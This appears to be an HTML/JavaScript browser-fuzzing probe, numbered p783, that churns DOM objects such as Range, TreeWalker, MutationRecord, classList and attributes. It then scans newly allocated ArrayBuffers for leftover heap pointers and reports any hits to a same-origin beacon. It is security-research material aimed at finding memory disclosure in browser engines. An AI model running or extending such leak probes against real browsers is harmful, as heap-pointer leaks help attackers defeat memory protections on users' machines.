@@ -1,0 +1,347 @@
+<!--
+  p783: Selection/Range / TreeWalker / NodeIterator / MutationRecord residue
+
+  Selection and Range objects are backed by C++ FrameSelection and
+  Range classes. Each Range holds start/end container+offset pairs
+  as C++ BoundaryPoint objects with Node* references. Creating and
+  collapsing many ranges exercises the range allocator. Selection
+  changes trigger C++ layout invalidation state.
+
+  TreeWalker and NodeIterator are C++ DOM traversal objects that
+  maintain a currentNode pointer and filter callback reference.
+  Each step (nextNode/previousNode/parentNode/firstChild) updates
+  internal C++ state. Creating many walkers on deep trees and
+  stepping them exercises the traversal allocator.
+
+  MutationObserver records are C++ MutationRecord objects with
+  type, target, addedNodes, removedNodes, attributeName, oldValue
+  fields. Each record holds Node* references to the affected nodes.
+  High-frequency DOM mutations generate many records that are freed
+  when the observer callback returns and records are GC'd.
+
+  DOMTokenList (element.classList) maintains a C++ SpaceSplitString
+  with an atomized string cache. Bulk add/remove of class tokens
+  exercises this cache.
+
+  NamedNodeMap (element.attributes) is a C++ wrapper over the
+  element's attribute vector. Bulk attribute manipulation exercises
+  the internal Attribute object allocator.
+
+  Attack angles:
+  A) Range create/collapse/detach churn on deep DOM.
+  B) TreeWalker/NodeIterator traversal state residue.
+  C) MutationRecord flood via rapid DOM mutations.
+  D) DOMTokenList (classList) bulk add/remove churn.
+  E) NamedNodeMap bulk attribute set/remove churn.
+  F) Selection API collapse/extend/modify churn.
+
+  CRASH_CLASS: LOW (DOM traversal/selection APIs, no side effects)
+  prior art: p774 (DOM traversal objects), p777 (Observer APIs)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p783</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p783-START');
+
+// Build a deep DOM tree for sections A, B, F
+var tree=document.createElement('div');
+tree.id='tree';
+function buildTree(parent,depth,breadth){
+  if(depth<=0)return;
+  for(var i=0;i<breadth;i++){
+    var child=document.createElement('span');
+    child.textContent='node_d'+depth+'_i'+i;
+    child.setAttribute('data-depth',String(depth));
+    child.className='level'+depth;
+    parent.appendChild(child);
+    buildTree(child,depth-1,breadth);
+  }
+}
+buildTree(tree,5,3);
+document.body.appendChild(tree);
+var allNodes=tree.querySelectorAll('*');
+b('tree built: '+allNodes.length+' nodes');
+
+// === Section A: Range create/collapse/detach churn ===
+try{
+  b('A-range');
+  var aHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var ranges=[];
+      for(var i=0;i<100;i++){
+        var r=document.createRange();
+        var startNode=allNodes[i%allNodes.length];
+        var endIdx=Math.min(i+5,allNodes.length-1);
+        var endNode=allNodes[endIdx];
+
+        try{
+          r.setStart(startNode,0);
+          r.setEnd(endNode,endNode.childNodes.length);
+        }catch(e){
+          r.selectNodeContents(startNode);
+        }
+        ranges.push(r);
+      }
+
+      if(round===0){
+        b('A created '+ranges.length+' ranges');
+        if(ranges[0].toString)b('A sample range text len='+ranges[0].toString().length);
+      }
+
+      for(var i=0;i<ranges.length;i++){
+        try{
+          ranges[i].collapse(true);
+          ranges[i].detach();
+        }catch(e){}
+      }
+      ranges=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    aHits+=sprayAndScan('A',round,[32,48,64,96]);
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: TreeWalker/NodeIterator traversal state ===
+try{
+  b('B-treewalker');
+  var bHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var walkers=[];
+
+      for(var i=0;i<30;i++){
+        var tw=document.createTreeWalker(tree,NodeFilter.SHOW_ELEMENT,null,false);
+        var steps=0;
+        while(tw.nextNode()&&steps<50)steps++;
+        walkers.push(tw);
+      }
+
+      for(var i=0;i<30;i++){
+        var ni=document.createNodeIterator(tree,NodeFilter.SHOW_ELEMENT,null,false);
+        var steps=0;
+        while(ni.nextNode()&&steps<50)steps++;
+        walkers.push(ni);
+      }
+
+      if(round===0)b('B created 30 TreeWalkers + 30 NodeIterators, stepped each 50x');
+
+      for(var i=0;i<walkers.length;i++){
+        try{
+          if(walkers[i].detach)walkers[i].detach();
+        }catch(e){}
+      }
+      walkers=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    bHits+=sprayAndScan('B',round,[32,48,64,96,128]);
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: MutationRecord flood via rapid DOM mutations ===
+try{
+  b('C-mutation-records');
+  var cHits=0;
+
+  for(var round=0;round<5;round++){
+    var container=document.createElement('div');
+    document.body.appendChild(container);
+
+    var recordCount=0;
+    var obs=new MutationObserver(function(records){
+      recordCount+=records.length;
+    });
+    obs.observe(container,{childList:true,attributes:true,characterData:true,subtree:true});
+
+    for(var i=0;i<100;i++){
+      var el=document.createElement('div');
+      el.textContent='mutation_'+round+'_'+i;
+      el.setAttribute('data-idx',String(i));
+      container.appendChild(el);
+    }
+
+    for(var i=container.children.length-1;i>=50;i--){
+      container.removeChild(container.children[i]);
+    }
+
+    for(var i=0;i<50&&i<container.children.length;i++){
+      container.children[i].setAttribute('data-round',String(round));
+      container.children[i].setAttribute('data-modified','true');
+      if(container.children[i].firstChild){
+        container.children[i].firstChild.textContent='updated_'+i;
+      }
+    }
+
+    if(round===0)b('C mutation records so far='+recordCount);
+
+    obs.disconnect();
+    document.body.removeChild(container);
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    cHits+=sprayAndScan('C',round,[48,64,96,128]);
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: DOMTokenList (classList) bulk add/remove ===
+try{
+  b('D-classlist');
+  var dHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var elements=[];
+      for(var i=0;i<50;i++){
+        var el=document.createElement('div');
+        document.body.appendChild(el);
+
+        for(var j=0;j<30;j++){
+          el.classList.add('cls_'+round+'_'+i+'_'+j);
+        }
+
+        if(i===0&&round===0)b('D classList.length='+el.classList.length);
+
+        for(var j=0;j<30;j++){
+          el.classList.remove('cls_'+round+'_'+i+'_'+j);
+        }
+        elements.push(el);
+      }
+
+      if(round===0)b('D churned 50 elements x 30 classes each');
+
+      for(var i=0;i<elements.length;i++){
+        document.body.removeChild(elements[i]);
+      }
+      elements=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    dHits+=sprayAndScan('D',round,[32,48,64,96]);
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: NamedNodeMap bulk attribute set/remove ===
+try{
+  b('E-attributes');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var elements=[];
+      for(var i=0;i<50;i++){
+        var el=document.createElement('div');
+        document.body.appendChild(el);
+
+        for(var j=0;j<30;j++){
+          el.setAttribute('data-attr-'+round+'-'+i+'-'+j,
+            'value_'+'a'.repeat(20+j%15));
+        }
+
+        if(i===0&&round===0)b('E attributes.length='+el.attributes.length);
+
+        for(var j=0;j<30;j++){
+          el.removeAttribute('data-attr-'+round+'-'+i+'-'+j);
+        }
+        elements.push(el);
+      }
+
+      if(round===0)b('E churned 50 elements x 30 attributes each');
+
+      for(var i=0;i<elements.length;i++){
+        document.body.removeChild(elements[i]);
+      }
+      elements=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    eHits+=sprayAndScan('E',round,[32,48,64,96,128]);
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: Selection API collapse/extend/modify ===
+try{
+  b('F-selection');
+  var fHits=0;
+  var sel=window.getSelection?window.getSelection():null;
+
+  if(!sel){
+    b('F-SKIP no getSelection');
+  }else{
+    for(var round=0;round<5;round++){
+      for(var i=0;i<50;i++){
+        try{
+          var node=allNodes[i%allNodes.length];
+          var range=document.createRange();
+          range.selectNodeContents(node);
+
+          sel.removeAllRanges();
+          sel.addRange(range);
+
+          if(sel.rangeCount>0){
+            try{sel.collapseToStart();}catch(e){}
+            try{
+              var nextNode=allNodes[(i+1)%allNodes.length];
+              sel.extend(nextNode,0);
+            }catch(e){}
+          }
+
+          sel.removeAllRanges();
+        }catch(e){
+          if(i===0&&round===0)b('F sel_err='+e.message);
+        }
+      }
+
+      if(round===0)b('F performed 50 selection cycles');
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      fHits+=sprayAndScan('F',round,[32,48,64,96]);
+    }
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+// Cleanup
+document.body.removeChild(tree);
+
+b('p783-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
